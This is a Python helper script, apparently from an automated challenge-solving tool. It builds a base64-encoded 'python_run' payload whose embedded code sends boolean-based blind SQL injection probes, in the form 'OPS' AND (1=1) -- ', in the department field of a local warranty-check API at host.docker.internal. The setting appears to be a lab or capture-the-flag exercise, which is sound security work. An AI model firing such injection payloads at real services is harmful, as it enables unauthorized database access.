"""Build the ``python_run`` payload used to prove the container-side path.

Kept as a file so the SQL literal (which contains quotes) never has to survive
a shell round-trip.
"""

from __future__ import annotations

import base64
import json
import sys
from pathlib import Path

BACKEND = Path(__file__).resolve().parents[3]
sys.path.insert(0, str(BACKEND))

from app.solver.muteki.worker.openai_compatible import _PYTHON_RUN_SCRIPT  # noqa: E402

HERE = Path(__file__).resolve().parent

CODE = r'''
import json, urllib.request

TARGET = "http://host.docker.internal:8383/api/warranty/check"


def ask(condition):
    body = json.dumps(
        {"asset_no": "PC-2026-013", "department": "OPS' AND (" + condition + ") -- "}
    ).encode()
    request = urllib.request.Request(
        TARGET, data=body, headers={"Content-Type": "application/json"}
    )
    return json.loads(urllib.request.urlopen(request, timeout=10).read())["matched"]


print("cwd:", __import__("os").getcwd())
print("true-case:", ask("1=1"))
print("false-case:", ask("1=2"))
'''.strip()


def main() -> int:
    (HERE / "_pyrun_wrapper.py").write_text(_PYTHON_RUN_SCRIPT, encoding="utf-8")
    payload = base64.b64encode(
        json.dumps(
            {"code": CODE, "target": "http://host.docker.internal:8383/", "timeout": 60}
        ).encode()
    ).decode()
    (HERE / "_pyrun_payload.txt").write_text(payload, encoding="utf-8")
    print("wrapper+bayload written")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
